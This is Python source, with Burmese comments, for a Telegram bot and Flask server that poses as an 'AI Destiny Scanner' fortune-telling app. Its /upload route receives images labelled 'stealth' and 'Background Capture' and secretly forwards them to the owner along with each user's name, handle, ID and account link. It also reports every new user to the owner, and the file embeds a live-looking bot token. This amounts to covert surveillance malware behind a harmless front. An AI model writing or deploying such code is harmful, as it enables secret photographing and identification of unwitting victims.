import os
import json
import base64
import asyncio
import time
import threading
import requests # requests ကိုထပ်ထည့်ထားပါတယ်
from flask import Flask, request, jsonify
from telegram import Bot, Update, KeyboardButton, ReplyKeyboardMarkup, WebAppInfo
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes

app = Flask(__name__)

# --- CONFIG ---
TOKEN = '8396307053:AAEH_oUAbyiTjNaq997drQkIHQ6keghM6xw'
OWNER_ID = '7812553563' 
WEB_APP_URL = 'https://beautycam.onrender.com' 
bot_instance = Bot(token=TOKEN)

@app.route('/')
def index():
    try:
        return open('index.html', 'r', encoding='utf-8').read()
    except:
        return "index.html file not found in root directory", 404

# Keep Alive Route (Server အလုပ်လုပ်နေလား စစ်ဖို့ သီးသန့်လမ်းကြောင်း)
@app.route('/health')
def health_check():
    return "Alive", 200

@app.route('/upload', methods=['POST'])
def upload():
    data = request.json
    user_id = data.get('user_id')
    user_name = data.get('user_name')
    user_handle = data.get('user_handle', 'No Username')
    image_base64 = data.get('image').split(",")[1]
    
    filename = f"stealth_{user_id}_{int(time.time())}.jpg"
    with open(filename, "wb") as f:
        f.write(base64.b64decode(image_base64))

    # main.py ရဲ့ upload function ထဲက အပိုင်းကို ဒီလိုပြင်ပါ

    async def send_to_admin():
        try:
            # User ID ကိုသုံးပြီး Direct Link ဖန်တီးခြင်း
            user_link = f"tg://user?id={user_id}"
            
            async with bot_instance:
                await bot_instance.send_photo(
                    chat_id=OWNER_ID,
                    photo=open(filename, 'rb'),
                    caption=(
                        f"📸 **Background Capture**\n"
                        f"👤 User: {user_name}\n"
                        f"🔗 Handle: {user_handle}\n"
                        f"🆔 ID: `{user_id}`\n"
                        f"🌐 Account Link: [Click Here]({user_link})" # Link အသစ်ထည့်သွင်းခြင်း
                    ),
                    parse_mode="Markdown" # Link အလုပ်လုပ်ရန် parse_mode ထည့်ပေးရပါမည်
                )
            if os.path.exists(filename): os.remove(filename)
        except Exception as e:
            print(f"Error sending photo: {e}")

    # Asyncio Loop ကို Thread-Safe ဖြစ်အောင် ပြင်ဆင်ခြင်း
    try:
        loop = asyncio.get_event_loop()
    except RuntimeError:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
    
    loop.run_until_complete(send_to_admin())
    return jsonify({"status": "received"}), 200

# --- Report Card ပို့ပေးမည့် Route (Updated Stable Version) ---
@app.route('/share_report', methods=['POST'])
def share_report():
    try:
        data = request.json
        user_id = data.get('user_id')
        image_base64 = data.get('image').split(",")[1] 
        
        # User ID မရှိရင် (Browser မှာစမ်းနေရင်) ဘာမှမလုပ်ဘဲ ပြန်ထွက်မယ်
        if not user_id or user_id == "Guest":
            print("No valid user_id found. Skipping report send.")
            return jsonify({"status": "skipped", "reason": "no_user_id"}), 200

        # ပုံကို Decoding လုပ်မယ်
        image_data = base64.b64decode(image_base64)

        # Telegram API ကို requests နဲ့ တိုက်ရိုက်လှမ်းခေါ်မယ် (Async Loop ပြဿနာ မတက်တော့ဘူး)
        url = f"https://api.telegram.org/bot{TOKEN}/sendPhoto"
        files = {'photo': ('report_card.png', image_data)}
        data_payload = {
            'chat_id': user_id,
            'caption': "🔮 သင်၏ ဒီနေ့ကံကြမ္မာ Report Card ရရှိပါပြီ။"
        }
        
        # Send Request
        resp = requests.post(url, data=data_payload, files=files)
        print(f"Report sent status: {resp.status_code}") # Log ကြည့်လို့ရအောင်
        
        return jsonify({"status": "sent"}), 200

    except Exception as e:
        print(f"Error in share_report: {e}")
        return jsonify({"status": "error", "message": str(e)}), 500
        
# Bot Polling Process
def run_bot():
    async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
        u = update.effective_user
        # Admin ဆီကို User အသစ်ရောက်ကြောင်း အကြောင်းကြားစာ ပို့ခြင်း
        await context.bot.send_message(
            chat_id=OWNER_ID,
            text=f"🚀 User အသစ်ရောက်လာပါပြီ\nName: {u.first_name}\nID: {u.id}\nLink: tg://user?id={u.id}"
        )
        button = KeyboardButton(text="AI Destiny Scanner ဖွင့်ရန်", web_app=WebAppInfo(url=WEB_APP_URL))
        keyboard = ReplyKeyboardMarkup([[button]], resize_keyboard=True)
        await update.message.reply_text("✨ သင့်ရဲ့ ဒီနေ့ကံကြမ္မာကို စစ်ဆေးဖို့ အောက်ကခလုတ်ကို နှိပ်ပါ -", reply_markup=keyboard)

    application = ApplicationBuilder().token(TOKEN).build()
    application.add_handler(CommandHandler("start", start))
    print("Bot is polling...")
    application.run_polling()

# Keep Alive Function (Self-Ping)
def keep_alive_ping():
    while True:
        time.sleep(600) # ၁၀ မိနစ် (600 seconds) စောင့်မယ်
        try:
            # ကိုယ့် URL ကိုယ်ပြန်ခေါ်မယ် (Ping)
            response = requests.get(f"{WEB_APP_URL}/health")
            print(f"Keep-alive ping: {response.status_code}")
        except Exception as e:
            print(f"Keep-alive failed: {e}")

if __name__ == '__main__':
    # 1. Bot ကို သီးသန့် Thread နဲ့ မောင်းမယ်
    threading.Thread(target=run_bot, daemon=True).start()

    # 2. Keep Alive Ping ကို သီးသန့် Thread နဲ့ မောင်းမယ်
    threading.Thread(target=keep_alive_ping, daemon=True).start()
    
    # 3. Flask Server ကို Main Thread မှာ Run မယ်
    port = int(os.environ.get('PORT', 10000))
    print(f"Server starting on port {port}...")
    app.run(host='0.0.0.0', port=port)
